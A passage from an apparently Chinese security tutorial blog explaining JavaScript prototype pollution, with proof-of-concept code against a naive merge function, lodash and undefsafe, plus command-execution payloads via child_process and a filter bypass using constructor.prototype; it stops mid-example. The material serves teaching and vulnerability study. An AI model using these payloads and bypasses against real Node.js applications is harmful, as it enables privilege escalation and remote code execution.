class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me.age)<br><span class="hljs-comment">// 此时再用Object创建一个空的him对象</span><br>let him = &#123;&#125;<br><span class="hljs-comment">// 查看him.age，是18</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(him.age)<br></code></pre></td></tr></table></figure>
+
+<p>发现，我们用Object类创建了一个him对象<code>let him = &#123;&#125;</code>，him对象也有一个age属性了。</p>
+<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
+<p>但是发现<code>me.__proto__</code>直接修改的是<code>Object.prototype</code>，为什么呢？</p>
+<p>注意这里有个关键点</p>
+<table>
+<thead>
+<tr>
+<th>创建方式</th>
+<th><code>me.__proto__</code>指向</th>
+<th><code>me.__proto__</code>内容</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>字面量 {}</td>
+<td><code>Object.prototype</code></td>
+<td>{}</td>
+<td>实际上有很多内置方法</td>
+</tr>
+<tr>
+<td>构造函数 new</td>
+<td><code>Person.prototype</code></td>
+<td>{}</td>
+<td>默认空对象，但有 constructor 指向 Person</td>
+</tr>
+</tbody></table>
+<p>所以，除了通过 <code>Object.create(null)</code> 或 <code>Object.create(XXX)</code> 等方式创建的对象，绝大多数“非 new 构造函数”创建的普通对象，其 <code>__proto__</code> 都指向 <code>Object.prototype</code>。</p>
+<p>ok，那我们明白原型链污染是什么了，接下来我们讲一讲实际中怎么导致原型链污染。</p>
+<h2 id="如何污染"><a href="#如何污染" class="headerlink" title="如何污染"></a>如何污染</h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
+<p>其实就是哪些情况下我们可以设置<code>__proto__</code>的值呢？</p>
+<p>找找能够控制数组（对象）的“键名”的操作即可：</p>
+<ul>
+<li>对象merge，即merge() 函数</li>
+<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中），即clone() 内核</li>
+<li>copy() 函数</li>
+</ul>
+<p>以对象merge为例，我们想象一个简单的merge函数：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//把 source 对象（源对象）中的所有属性，递归地合并到 target 对象（目标对象）里</span><br>function <span class="hljs-built_in">merge</span>(target, source) &#123;<br>    <span class="hljs-keyword">for</span> (let key <span class="hljs-keyword">in</span> source) &#123;<span class="hljs-comment">//遍历 source 对象的所有属性</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">source</span> &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-built_in">merge</span>(target<span class="hljs-selector-attr">[key]</span>, <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span>)<span class="hljs-comment">//如果这两个属性的值都是对象，就会继续把它们里面的内容合并</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target<span class="hljs-selector-attr">[key]</span> = <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span><span class="hljs-comment">//否则，直接把 source 的属性赋值到 target 上</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p>
+<p>我们用如下代码实验一下：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">function <span class="hljs-built_in">merge</span>(target, source) &#123;<br>    <span class="hljs-keyword">for</span> (let key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">source</span> &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-built_in">merge</span>(target<span class="hljs-selector-attr">[key]</span>, <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span>)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target<span class="hljs-selector-attr">[key]</span> = <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>let o1 = &#123;&#125;<br>let o2 = &#123;<span class="hljs-selector-tag">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-selector-tag">b</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(o1, o2)</span></span><br>console<span class="hljs-selector-class">.log</span>(o1.a) <span class="hljs-comment">// 1</span><br>console<span class="hljs-selector-class">.log</span>(o1.b) <span class="hljs-comment">// 2</span><br>o3 = &#123;&#125;<br>console<span class="hljs-selector-class">.log</span>(o3.b) <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure>
+
+<p>结果是，合并虽然成功了，但原型链没有被污染：</p>
+<p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
+<p>上面那句实际上是把你 o2 的原型定义为创建的新对象 <code>&#123;b: 2&#125;</code>，也就是<strong>自定义了原型</strong>。</p>
+<p>这样的话，o2本身有<code>a: 1</code>，然后又从他的原型 <code>&#123;b: 2&#125;</code>那里继承了<code>b: 2</code>，再把这两个值<code>[a, b]</code>赋给o1，所以只是o1多了两个属性，并不会对 <code>Object.prototype</code>产生任何影响。</p>
+<p>所以新创建的o3不会有b这一属性。</p>
+<p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p>
+<p>我们将代码改成如下：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">function <span class="hljs-built_in">merge</span>(target, source) &#123;<br>    <span class="hljs-keyword">for</span> (let key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">source</span> &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-built_in">merge</span>(target<span class="hljs-selector-attr">[key]</span>, <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span>)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target<span class="hljs-selector-attr">[key]</span> = <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>let o1 = &#123;&#125;<br>let o2 = JSON<span class="hljs-selector-class">.parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(o1, o2)</span></span><br>console<span class="hljs-selector-class">.log</span>(o1<span class="hljs-selector-class">.a</span>, o1.b) <span class="hljs-comment">// 1 2</span><br>o3 = &#123;&#125;<br>console<span class="hljs-selector-class">.log</span>(o3.b) <span class="hljs-comment">// 2</span><br></code></pre></td></tr></table></figure>
+
+<p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p>
+<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
+<p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
+<p>当然，原型链污染有一些实际利用的payload以及绕过技巧。</p>
+<p>直接 require（可能被禁用&#x2F;覆盖&#x2F;不可用）：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&#x27;child_process&#x27;</span>)</span></span><span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>EXP 常用的 _load：</p>
+<p>很多EXP用<code>global.process.mainModule.constructor._load</code>，就是因为它不依赖于上下文里的require变量，不容易被删掉或限制，更通用、更隐蔽，更适合在利用原型链污染时远程加载和利用Node.js内置模块。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">global<span class="hljs-selector-class">.process</span><span class="hljs-selector-class">.mainModule</span><span class="hljs-selector-class">.constructor</span>.<span class="hljs-built_in">_load</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>而且有时候<code>__proto__ </code>已被过滤，因此可以用<code>constructor.prototype</code>代替，例如：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>下面我们讲一下实际可以污染的模块（已知漏洞）。</p>
+<h2 id="Lodash-模块"><a href="#Lodash-模块" class="headerlink" title="Lodash 模块"></a>Lodash 模块</h2><p>Lodash 是一个 JavaScript 库，包含简化字符串、数字、数组、函数和对象编程的工具，可以帮助程序员更有效地编写和维护 JavaScript 代码。并且是一个流行的 npm 库，仅在GitHub 上就有超过 400 万个项目使用，Lodash的普及率非常高，每月的下载量超过 8000 万次。但是这个库中有几个严重的原型污染漏洞。</p>
+<h3 id="lodash-defaultsDeep-方法"><a href="#lodash-defaultsDeep-方法" class="headerlink" title="lodash.defaultsDeep 方法"></a>lodash.defaultsDeep 方法</h3><p>2019 年 7 月 2 日，<a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-LODASH-450202">Snyk 发布了一个高严重性原型污染安全漏洞</a>（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。</p>
+<p>Lodash 库中的 <code>defaultsDeep</code> 函数可能会被包含 <code>constructor</code> 的 Payload 诱骗添加或修改<code>Object.prototype</code> 。最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。以下是 Snyk 给出的此漏洞验证 POC：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> mergeFn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>).<span class="hljs-property">defaultsDeep</span>;<br><span class="hljs-keyword">const</span> payload = <span class="hljs-string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">mergeFn</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(payload));<br>    <span class="hljs-keyword">if</span> ((&#123;&#125;)[<span class="hljs-string">`a0`</span>] === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Vulnerable to Prototype Pollution via <span class="hljs-subst">$&#123;payload&#125;</span>`</span>);<br>    &#125;<br>  &#125;<br><br><span class="hljs-title function_">check</span>();<br></code></pre></td></tr></table></figure>
+
+<h3 id="lodash-merge-方法"><a href="#lodash-merge-方法" class="headerlink" title="lodash.merge 方法"></a>lodash.merge 方法</h3><p>Lodash.merge 作为 lodash 中的对象合并插件，他可以<strong>递归</strong>合并 <code>sources</code> 来源对象自身和继承的可枚举属性到 <code>object</code> 目标对象，以创建父映射对象：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(object, sources)</span></span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>参数</strong>：merge(object, sources)<ul>
+<li><code>object</code>：目标对象，合并的结果会写入它（通常会改变它本身）。</li>
+<li><code>sources</code>：一个或多个源对象，按顺序合并到目标对象里。</li>
+</ul>
+</li>
+<li><strong>规则</strong>：<ul>
+<li>当多个对象有<strong>相同的键</strong>时，<strong>最右边（最后）的源对象的值会覆盖之前的值</strong>。</li>
+<li>如果有多个对象完全一样（比如多次合并同一个对象），合并结果也只会有一份对应的键和值。</li>
+</ul>
+</li>
+</ul>
+<p>下面给出一个验证漏洞的 POC：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> lodash= require(&#x27;lodash&#x27;);<br><span class="hljs-keyword">var</span> payload = &#x27;&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;whoami&quot;</span>:<span class="hljs-string">&quot;Vulnerable&quot;</span>&#125;&#125;&#x27;;<br><br><span class="hljs-keyword">var</span> a = &#123;&#125;;<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Before whoami: &quot;</span> + a.whoami);<br>lodash.<span class="hljs-keyword">merge</span>(&#123;&#125;, JSON.<span class="hljs-keyword">parse</span>(payload));<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;After whoami: &quot;</span> + a.whoami);<br></code></pre></td></tr></table></figure>
+
+<p>在 lodash.merge 方法造成的原型链污染中，为了实现代码执行，我们常常会污染 <code>sourceURL</code> 属性，即给所有 Object 对象中都插入一个 <code>sourceURL</code> 属性，然后通过 lodash.template 方法中的拼接实现任意代码执行漏洞，如 [Code-Breaking 2018] Thejs 这道题。</p>
+<h3 id="lodash-mergeWith-方法"><a href="#lodash-mergeWith-方法" class="headerlink" title="lodash.mergeWith 方法"></a>lodash.mergeWith 方法</h3><p>这个方法类似于 <code>merge</code> 方法。但是它还会接受一个 <code>customizer</code>，以决定如何进行合并。 如果 <code>customizer</code> 返回 <code>undefined</code> 将会由合并处理方法代替。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mergeWith</span><span class="hljs-params">(object, sources, [customizer])</span></span><br></code></pre></td></tr></table></figure>
+
+<p>该方法与 <code>merge</code> 方法一样存在原型链污染漏洞，下面给出一个验证漏洞的 POC：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> lodash= require(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;whoami&quot;:&quot;Vulnerable&quot;&#125;&#125;&#x27;</span>;<br><br><span class="hljs-keyword">var</span> a = &#123;&#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Before whoami: &quot;</span> + a.whoami);<br>lodash.mergeWith(&#123;&#125;, JSON.parse(payload));<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;After whoami: &quot;</span> + a.whoami);<br></code></pre></td></tr></table></figure>
+
+<h3 id="lodash-set-方法"><a href="#lodash-set-方法" class="headerlink" title="lodash.set 方法"></a>lodash.set 方法</h3><p>Lodash.set 方法可以用来设置值到对象对应的属性路径上，如果没有则创建这部分路径。 缺少的索引属性会创建为数组，而缺少的属性会创建为对象。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span>(<span class="hljs-keyword">object</span>, <span class="hljs-type">path</span>, <span class="hljs-keyword">value</span>)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>示例：</li>
+</ul>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> <span class="hljs-built_in">object</span> = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br><br>_.<span class="hljs-keyword">set</span>(<span class="hljs-built_in">object</span>, <span class="hljs-string">&#x27;a[0].b.c&#x27;</span>, <span class="hljs-number">4</span>);<br>console.log(<span class="hljs-built_in">object</span>.a[<span class="hljs-number">0</span>].b.c);<br><span class="hljs-comment">// =&gt; 4</span><br><br>_.<span class="hljs-keyword">set</span>(<span class="hljs-built_in">object</span>, <span class="hljs-string">&#x27;x[0].y.z&#x27;</span>, <span class="hljs-number">5</span>);<br>console.log(<span class="hljs-built_in">object</span>.x[<span class="hljs-number">0</span>].y.z);<br><span class="hljs-comment">// =&gt; 5</span><br></code></pre></td></tr></table></figure>
+
+<p>在使用 Lodash.set 方法时，如果没有对传入的参数进行过滤，则可能会造成原型链污染。下面给出一个验证漏洞的 POC：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> lodash= require(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">var</span> object_1 = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br><span class="hljs-keyword">var</span> object_2 = &#123;&#125;<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(object_1.whoami);<br><span class="hljs-comment">//lodash.set(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br>lodash.set(object_2, <span class="hljs-string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="hljs-string">&#x27;Vulnerable&#x27;</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(object_1.whoami);<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="lodash-setWith-方法"><a href="#lodash-setWith-方法" class="headerlink" title="lodash.setWith 方法"></a>lodash.setWith 方法</h3><p>Lodash.setWith 方法类似 <code>set</code> 方法。但是它还会接受一个 <code>customizer</code>，用来调用并决定如何设置对象路径的值。 如果 <code>customizer</code> 返回 <code>undefined</code> 将会有它的处理方法代替。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">setWith(<span class="hljs-selector-tag">object</span>, <span class="hljs-selector-tag">path</span>, value, <span class="hljs-selector-attr">[customizer]</span>)<br></code></pre></td></tr></table></figure>
+
+<p>该方法与 <code>set</code> 方法一样可以进行原型链污染，下面给出一个验证漏洞的 POC：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> lodash= require(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">var</span> object_1 = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br><span class="hljs-keyword">var</span> object_2 = &#123;&#125;<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(object_1.whoami);<br><span class="hljs-comment">//lodash.setWith(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br>lodash.setWith(object_2, <span class="hljs-string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="hljs-string">&#x27;Vulnerable&#x27;</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(object_1.whoami);<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Undefsafe-模块"><a href="#Undefsafe-模块" class="headerlink" title="Undefsafe 模块"></a>Undefsafe 模块</h2><p>Undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞（CVE-2019-10795），攻击者可利用该漏洞添加或修改 Object.prototype 属性。</p>
+<p>我们先简单测试一下该模块的使用，</p>
+<p>可以看到当我们正常访问object属性的时候会有正常的回显，但当我们访问不存在属性时则会得到报错：</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">var</span> <span class="hljs-built_in">object</span> = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;skysec&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>)<span class="hljs-comment">// skysec</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">a</span>.<span class="hljs-property">c</span>.<span class="hljs-property">e</span>)<span class="hljs-comment">// TypeError: Cannot read properties of undefined (reading &#x27;e&#x27;)</span><br></code></pre></td></tr></table></figure>
+
+<p>在编程时，代码量较大时，我们可能经常会遇到类似情况，导致程序无法正常运行，发送我们最讨厌的报错。那么 undefsafe 可以帮助我们解决这个问题：</p>
+<p>那么当我们无意间访问到对象不存在的属性时，就不会再进行报错，而是会返回 undefined 了。</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">a</span>(<span class="hljs-built_in">object</span>,<span class="hljs-string">&#x27;a.b.e&#x27;</span>))<br><span class="hljs-comment">// skysec</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>)<br><span class="hljs-comment">// skysec</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">a</span>(<span class="hljs-built_in">object</span>,<span class="hljs-string">&#x27;a.c.e&#x27;</span>))<br><span class="hljs-comment">// undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">a</span>.<span class="hljs-property">c</span>.<span class="hljs-property">e</span>)<br><span class="hljs-comment">// TypeError: Cannot read property &#x27;e&#x27; of undefined</span><br></code></pre></td></tr></table></figure>
+
+<p>同时在对对象赋值时，如果目标属性存在：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">var a <span class="hljs-operator">=</span> require(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br>var object <span class="hljs-operator">=</span> &#123;<br>    <span class="hljs-params">a:</span> &#123;<br>        <span class="hljs-params">b:</span> &#123;<br>            <span class="hljs-params">c:</span> <span class="hljs-number">1</span>,<br>            <span class="hljs-params">d:</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-params">e:</span> &#x27;skysec&#x27;<br>        &#125;<br>    &#125;<br>&#125;;<br>console.log(object)<br><span class="hljs-operator">//</span> &#123; <span class="hljs-params">a:</span> &#123; <span class="hljs-params">b:</span> &#123; <span class="hljs-params">c:</span> <span class="hljs-number">1</span>, <span class="hljs-params">d:</span> [Array], <span class="hljs-params">e:</span> &#x27;skysec&#x27; &#125; &#125; &#125;<br>a(object,&#x27;a.b.e&#x27;,&#x27;<span class="hljs-number">123</span>&#x27;)<br>console.log(object)<br><span class="hljs-operator">//</span> &#123; <span class="hljs-params">a:</span> &#123; <span class="hljs-params">b:</span> &#123; <span class="hljs-params">c:</span> <span class="hljs-number">1</span>, <span class="hljs-params">d:</span> [Array], <span class="hljs-params">e:</span> &#x27;<span class="hljs-number">123</span>&#x27; &#125; &#125; &#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们可以看到，其可以帮助我们修改对应属性的值。如果当属性不存在时，我们想对该属性赋值：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">var a <span class="hljs-operator">=</span> require(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br>var object <span class="hljs-operator">=</span> &#123;<br>    <span class="hljs-params">a:</span> &#123;<br>        <span class="hljs-params">b:</span> &#123;<br>            <span class="hljs-params">c:</span> <span class="hljs-number">1</span>,<br>            <span class="hljs-params">d:</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span 